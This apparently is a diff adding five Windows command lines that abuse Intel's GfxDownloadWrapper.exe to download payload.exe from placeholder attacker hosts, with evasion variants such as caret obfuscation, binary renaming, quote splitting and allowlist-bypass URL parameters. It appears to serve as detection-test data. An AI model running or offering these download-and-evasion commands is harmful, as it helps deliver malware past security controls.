@@ -1,0 +1,5 @@
+cmd.exe /c "GfxDownloadWrapper.exe h^t^t^p^s^:^/^/http://malicious-domain.com/payload.exe"
+cmd.exe /c copy GfxDownloadWrapper.exe wrapper.exe && wrapper.exe http://malicious-domain.com/payload.exe
+GfxDownloadWrapper.exe "http""http://malicious-domain.com/payload.exe"
+GfxDownloadWrapper.exe "http://attacker.com/payload.exe?bypass=http://gameplayapi.intel.com/" "payload.exe"
+GfxDownloadWrapper.exe http://gameplayapi.intel.com/index.html?url=http://malicious-domain.com/payload.exe
